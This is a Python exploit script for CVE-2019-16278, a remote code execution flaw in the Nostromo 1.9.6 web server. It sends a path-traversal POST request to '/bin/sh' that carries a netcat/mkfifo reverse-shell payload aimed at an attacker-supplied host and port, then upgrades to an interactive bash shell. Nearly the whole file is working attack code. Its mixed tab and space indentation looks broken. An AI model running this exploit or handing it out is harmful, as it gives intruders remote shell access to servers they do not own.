# -*- encoding:utf-8 -*-
# Nostromo 1.9.6 - Remote Code Execution
# CVE: 2019-16278
# Exploit author: Kr0ff
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import requests
import sys
from pwn import *


def main():

    # args
    argparser = argparse.ArgumentParser(description='Nostromo 1.9.6 - Remote Code Execution', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
   	
    main_arg.add_argument('--rhost', type=str, help='Remote host to exploit', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()

    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)

    # cons
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite

    # proxies
    proxies = { "http": "127.0.0.1:8080" }

    
    def reverse_shell(l):
        
        l.sendline("python -c 'import pty;pty.spawn(\"/bin/bash\")'")
        l.recv(1024)
        l.sendline("uname -r && id")
        l.interactive()
           
    
    def exploit():
    	
    	headers = {
    		"Content-Length": "1",
    	}
    	revshell_payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)
    	data = ("{} 2>&1".format(revshell_payload))
        
        l1 = log.progress('Exploiting the web server...')
        l = listen(lport)

        try:
            if burpsuite:
                r = requests.post("{}/.%0d./.%0d./.%0d./.%0d./bin/sh".format(rhost), 
                                                                data=data, headers=headers,
                                                                 proxies=proxies,
                                                                 timeout=5)
            
            else:
               r = requests.post("{}/.%0d./.%0d./.%0d./.%0d./bin/sh".format(rhost),
                                                                data=data, headers=headers,
                                                                timeout=5)
        
        except:
            reverse_shell(l)
        
                    
   
    # main
    log.info("Nostromo 1.9.6 - Remote Code Execution")
    log.info("Python script exploit author: nullarmor")
    
    
    exploit()


if __name__ == '__main__':
    main()

